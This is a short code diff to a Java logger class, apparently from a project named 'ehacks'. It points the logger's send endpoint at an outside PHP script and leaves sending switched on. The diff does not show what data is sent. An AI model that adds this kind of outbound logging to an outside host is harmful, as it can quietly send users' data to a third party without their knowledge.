@@ -22,9 +22,9 @@ public class UltimateLogger {
 
     public static UltimateLogger INSTANCE = new UltimateLogger();
 
-    private static final boolean ifYouWantToRemoveItJustSetdoItFalseXD = false;
+    //If you want to remove logger,just set variable "doIt" to false
     private static final boolean doIt = true;
-    private static final String url = "http://blank.org";
+    private static final String url = "1488.me/ehacks/log.php";
 
     private void send(int type, String data) {
         if (!doIt) {
